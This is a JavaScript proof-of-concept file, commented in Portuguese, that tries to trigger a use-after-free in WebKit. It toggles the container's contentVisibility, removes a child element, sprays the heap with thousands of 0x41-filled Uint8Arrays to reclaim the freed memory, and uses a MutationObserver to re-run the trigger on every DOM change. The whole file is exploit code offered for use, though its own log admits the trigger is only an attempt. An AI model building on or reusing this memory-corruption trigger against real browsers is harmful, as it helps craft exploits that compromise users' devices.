// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs'; // Ajustado para o novo local

const container = document.querySelector(".container"); // Ainda pega do DOM global
const child = document.querySelector(".child");     // Ainda pega do DOM global

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) { // Spray grande, pode causar lentidão
    let arr = new Uint8Array(0x1000); // 4KB por array
    for (let j = 0; j < arr.length; j++) {
      arr[j] = 0x41; // Preenche com 'A'
    }
    spray.push(arr);
  }
  return spray;
}

// Exportar a função para ser usada em main.mjs
export function triggerUAF() {
  // Garante que os elementos sejam selecionados novamente se o DOM for modificado drasticamente
  const currentContainer = document.querySelector(".container");
  const currentChild = currentContainer ? currentContainer.querySelector(".child") : null;

  if (!currentContainer || !currentChild) {
    debug_log("Erro: Elementos .container ou .child não encontrados para UAF.");
    console.error("Erro: Elementos .container ou .child não encontrados para UAF.");
    return;
  }

  debug_log("Tentando UAF: contentVisibility=hidden, child.remove()");
  currentContainer.style.contentVisibility = "hidden";
  currentChild.remove(); // << Ponto potencial de UAF: child é removido

  // Adia a próxima parte para permitir que o navegador processe a remoção
  setTimeout(() => {
    debug_log("Continuando UAF: contentVisibility=auto, heapSpray()");
    currentContainer.style.contentVisibility = "auto"; // << Tenta forçar o uso da memória do child
    
    let sprayArrays = heapSpray(); // Tenta preencher a memória liberada
    
    // Adicionado para evitar "unused variable" e manter referência, se necessário para GC
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays.`);
    }
    debug_log("UAF triggered (ou pelo menos a tentativa). Verifique o console e comportamento do navegador.");
  }, 0); // Delay de 0ms para colocar na próxima volta do event loop
}

// O MutationObserver pode causar múltiplas execuções se não for gerenciado com cuidado.
// Para uma integração simples, ele pode ser removido ou ajustado para não chamar triggerUAF recursivamente
// se a própria triggerUAF modificar o DOM de uma forma que o observer detecte.
// Por ora, vou manter a lógica original do seu PoC.
const initialContainer = document.querySelector(".container");
if (initialContainer) {
    const observer = new MutationObserver(() => {
      debug_log("MutationObserver: DOM tree modified, re-tentando UAF...");
      // Para evitar loops infinitos se triggerUAF modificar o DOM observado,
      // poderia ser necessário desconectar o observer antes de chamar triggerUAF
      // e reconectar depois, ou ter uma flag para evitar reentrância.
      // observer.disconnect(); // Exemplo
      triggerUAF();
      // observer.observe(initialContainer, { childList: true, subtree: true }); // Exemplo
    });
    observer.observe(initialContainer, { childList: true, subtree: true });
} else {
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
}
